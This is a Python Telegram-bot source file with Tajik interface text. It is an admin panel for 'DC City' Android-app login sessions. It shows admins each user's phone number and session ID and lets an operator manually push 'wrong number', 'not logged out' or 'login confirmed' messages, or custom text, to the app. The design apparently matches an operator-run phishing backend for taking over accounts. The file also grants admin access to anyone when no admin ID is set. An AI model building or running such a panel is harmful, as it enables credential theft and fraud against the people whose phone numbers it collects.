import os
import asyncio
from datetime import datetime
from typing import Optional
from dotenv import load_dotenv

from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from database import SessionLocal, UserSession, AdminLog

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
ADMIN_ID_RAW = os.getenv("ADMIN_ID", "")
ADMIN_IDS = [int(i.strip()) for i in ADMIN_ID_RAW.split(",") if i.strip().isdigit()]

bot: Optional[Bot] = None
dp = Dispatcher()


class CustomMessageState(StatesGroup):
    waiting_for_message = State()


def is_admin(user_id: int) -> bool:
    if not ADMIN_IDS:
        # If no ADMIN_ID specified yet in .env, allow first user for testing setup
        return True
    return user_id in ADMIN_IDS


def get_active_sessions():
    db = SessionLocal()
    try:
        return db.query(UserSession).order_by(UserSession.updated_at.desc()).limit(10).all()
    finally:
        db.close()


def update_session_command(session_id: str, command: str, message: str, admin_id: str):
    db = SessionLocal()
    try:
        session = db.query(UserSession).filter(UserSession.session_id == session_id).first()
        if not session:
            return False, "Сессия ёфт нашуд"

        session.status = command
        session.last_command = command
        session.last_message = message
        session.updated_at = datetime.utcnow()

        log = AdminLog(
            session_id=session_id,
            command=command,
            message=message,
            admin_id=admin_id
        )
        db.add(log)
        db.commit()
        return True, "Фармон бомуваффақият иҷро шуд"
    finally:
        db.close()


@dp.message(CommandStart())
async def handle_start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Шумо ҳуқуқи дастрасӣ ба ин ботро надоред.")
        return

    text = (
        "👋 **Хуш омадед ба панели идоракунии DC City Bot!**\n\n"
        "Ин бот барои идоракунии мустақими сессияҳои воридшавии корбарони замимаи Android хизмат мекунад.\n\n"
        "📌 **Фармонҳо:**\n"
        "• `/admin` — Панели асосии идоракунӣ ва рӯйхати сессияҳо\n"
        "• `/error1 <session_id>` — Фиристодани хатогии рақами нодуруст\n"
        "• `/error2 <session_id>` — Фиристодани огоҳии аз аккаунт набаромадан\n"
        "• `/success <session_id>` — Тасдиқи воридшавӣ"
    )
    await message.answer(text, parse_mode="Markdown")


@dp.message(Command("admin"))
async def handle_admin(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Шумо ҳуқуқи дастрасӣ надоред.")
        return

    sessions = get_active_sessions()
    if not sessions:
        await message.answer("ℹ️ Ҳоло ягон дархости фаъол аз ҷониби корбарон вуҷуд надорад.")
        return

    keyboard_builder = []
    text_lines = ["📋 **Рӯйхати дархостҳои охирин:**\n"]

    for s in sessions:
        status_emoji = {
            "pending": "⏳",
            "error1": "❌",
            "error2": "⚠️",
            "success": "✅",
            "custom": "💬"
        }.get(s.status, "❓")

        text_lines.append(
            f"{status_emoji} `+{s.phone.replace('+', '')}`\n"
            f"   ID: `{s.session_id}` | Ҳолат: `{s.status}`\n"
        )

        keyboard_builder.append([
            InlineKeyboardButton(
                text=f"{status_emoji} {s.phone} ({s.session_id})",
                callback_data=f"sel_{s.session_id}"
            )
        ])

    keyboard = InlineKeyboardMarkup(inline_keyboard=keyboard_builder)
    await message.answer("\n".join(text_lines), reply_markup=keyboard, parse_mode="Markdown")


@dp.callback_query(F.data.startswith("sel_"))
async def handle_select_session(callback: CallbackQuery):
    session_id = callback.data.split("sel_")[1]

    db = SessionLocal()
    session = db.query(UserSession).filter(UserSession.session_id == session_id).first()
    db.close()

    if not session:
        await callback.answer("Сессия ёфт нашуд!", show_alert=True)
        return

    text = (
        f"📱 **Идоракунии корбар:**\n\n"
        f"• **Рақам:** `{session.phone}`\n"
        f"• **Session ID:** `{session.session_id}`\n"
        f"• **Забон:** `{session.language}`\n"
        f"• **Ҳолати кунунӣ:** `{session.status}`\n"
        f"• **Паёми охирин:** {session.last_message or 'Ягон'}\n\n"
        f"Фармони заруриро интихоб кунед:"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="❌ /error1 (Рақами нодуруст)",
                callback_data=f"cmd_error1_{session_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="⚠️ /error2 (Аз аккаунт набаромадаед)",
                callback_data=f"cmd_error2_{session_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="✅ /success (Тасдиқи воридшавӣ)",
                callback_data=f"cmd_success_{session_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="💬 Паёми дилхоҳ (Custom)",
                callback_data=f"cmd_custom_{session_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="⬅️ Бозгашт ба рӯйхат",
                callback_data="refresh_list"
            )
        ]
    ])

    await callback.message.edit_text(text, reply_markup=keyboard, parse_mode="Markdown")
    await callback.answer()


@dp.callback_query(F.data.startswith("cmd_"))
async def handle_execute_command(callback: CallbackQuery, state: FSMContext):
    parts = callback.data.split("_")
    cmd_type = parts[1]
    session_id = parts[2]
    admin_id_str = str(callback.from_user.id)

    if cmd_type == "custom":
        await state.update_data(target_session_id=session_id)
        await state.set_state(CustomMessageState.waiting_for_message)
        await callback.message.answer(
            f"✏️ Лутфан матни паёмро барои сессияи `{session_id}` нависед:",
            parse_mode="Markdown"
        )
        await callback.answer()
        return

    if cmd_type == "error1":
        msg = "Рақами телефон нодуруст аст. Лутфан рақамро санҷед"
    elif cmd_type == "error2":
        msg = "Шумо ҳоло аз аккаунти худ баромад накардаед"
    elif cmd_type == "success":
        msg = "Муваффақият! Воридшавӣ тасдиқ шуд"
    else:
        msg = "Паёми админ"

    success, reply_text = update_session_command(session_id, cmd_type, msg, admin_id_str)

    if success:
        await callback.message.answer(
            f"🚀 **Фармон иҷро шуд!**\n"
            f"• Фармон: `/{cmd_type}`\n"
            f"• Ба корбар: `{session_id}`\n"
            f"• Паём: «{msg}»\n\n"
            f"Замимаи Android фавран паёмро қабул кард.",
            parse_mode="Markdown"
        )
    else:
        await callback.message.answer(f"❌ Хатогӣ: {reply_text}")

    await callback.answer()


@dp.message(CustomMessageState.waiting_for_message)
async def process_custom_message(message: Message, state: FSMContext):
    data = await state.get_data()
    session_id = data.get("target_session_id")
    await state.clear()

    if not session_id:
        await message.answer("Хатогӣ дар муайян кардани сессия.")
        return

    text = message.text.strip()
    update_session_command(session_id, "custom", text, str(message.from_user.id))

    await message.answer(
        f"💬 **Паёми фармоишӣ фиристода шуд!**\n"
        f"• Сессия: `{session_id}`\n"
        f"• Паём: «{text}»",
        parse_mode="Markdown"
    )


@dp.callback_query(F.data == "refresh_list")
async def handle_refresh_list(callback: CallbackQuery):
    await callback.message.delete()
    await handle_admin(callback.message)
    await callback.answer()


# Direct command handlers (/error1, /error2, /success)
@dp.message(Command("error1"))
async def handle_direct_error1(message: Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    session_id = args[1] if len(args) > 1 else None

    if not session_id:
        sessions = get_active_sessions()
        if sessions:
            session_id = sessions[0].session_id
        else:
            await message.answer("Истифода: `/error1 <session_id>`", parse_mode="Markdown")
            return

    msg = "Рақами телефон нодуруст аст. Лутфан рақамро санҷед"
    update_session_command(session_id, "error1", msg, str(message.from_user.id))
    await message.answer(f"❌ /error1 ба сессияи `{session_id}` фиристода шуд:\n«{msg}»", parse_mode="Markdown")


@dp.message(Command("error2"))
async def handle_direct_error2(message: Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    session_id = args[1] if len(args) > 1 else None

    if not session_id:
        sessions = get_active_sessions()
        if sessions:
            session_id = sessions[0].session_id
        else:
            await message.answer("Истифода: `/error2 <session_id>`", parse_mode="Markdown")
            return

    msg = "Шумо ҳоло аз аккаунти худ баромад накардаед"
    update_session_command(session_id, "error2", msg, str(message.from_user.id))
    await message.answer(f"⚠️ /error2 ба сессияи `{session_id}` фиристода шуд:\n«{msg}»", parse_mode="Markdown")


@dp.message(Command("success"))
async def handle_direct_success(message: Message):
    if not is_admin(message.from_user.id):
        return
    args = message.text.split()
    session_id = args[1] if len(args) > 1 else None

    if not session_id:
        sessions = get_active_sessions()
        if sessions:
            session_id = sessions[0].session_id
        else:
            await message.answer("Истифода: `/success <session_id>`", parse_mode="Markdown")
            return

    msg = "Муваффақият! Воридшавӣ тасдиқ шуд"
    update_session_command(session_id, "success", msg, str(message.from_user.id))
    await message.answer(f"✅ /success ба сессияи `{session_id}` фиристода шуд:\n«{msg}»", parse_mode="Markdown")


# Automated notification from backend when new user registers
async def notify_admin_new_session(session_id: str, phone: str, language: str):
    global bot
    if not bot or not ADMIN_IDS:
        return

    lang_labels = {"tj": "Тоҷикӣ", "ru": "Русский", "en": "English"}
    lang_name = lang_labels.get(language, language)

    text = (
        f"🔔 **Дархости нави воридшавӣ (DC City)!**\n\n"
        f"📱 **Рақам:** `{phone}`\n"
        f"🔑 **Session ID:** `{session_id}`\n"
        f"🌐 **Забон:** {lang_name}\n"
        f"⏰ **Вақт:** {datetime.now().strftime('%H:%M:%S')}\n\n"
        f"Интихоби амали фаврӣ:"
    )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(
                text="❌ /error1 (Рақами нодуруст)",
                callback_data=f"cmd_error1_{session_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="⚠️ /error2 (Аз аккаунт набаромадаед)",
                callback_data=f"cmd_error2_{session_id}"
            )
        ],
        [
            InlineKeyboardButton(
                text="✅ /success (Тасдиқ)",
                callback_data=f"cmd_success_{session_id}"
            )
        ]
    ])

    for admin_id in ADMIN_IDS:
        try:
            await bot.send_message(admin_id, text, reply_markup=keyboard, parse_mode="Markdown")
        except Exception as e:
            print(f"Error sending message to admin {admin_id}: {e}")


def init_telegram_bot():
    global bot
    token = os.getenv("BOT_TOKEN", "").strip()
    if token and token != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        bot = Bot(token=token)
        return bot
    return None


async def start_telegram_bot():
    global bot
    if not bot:
        bot = init_telegram_bot()

    if not bot:
        print("[Warning] BOT_TOKEN is not configured in .env. Telegram Bot not started.")
        return

    print("[Info] Starting aiogram Telegram Bot polling...")
    await dp.start_polling(bot)


if __name__ == "__main__":
    init_telegram_bot()
    asyncio.run(start_telegram_bot())
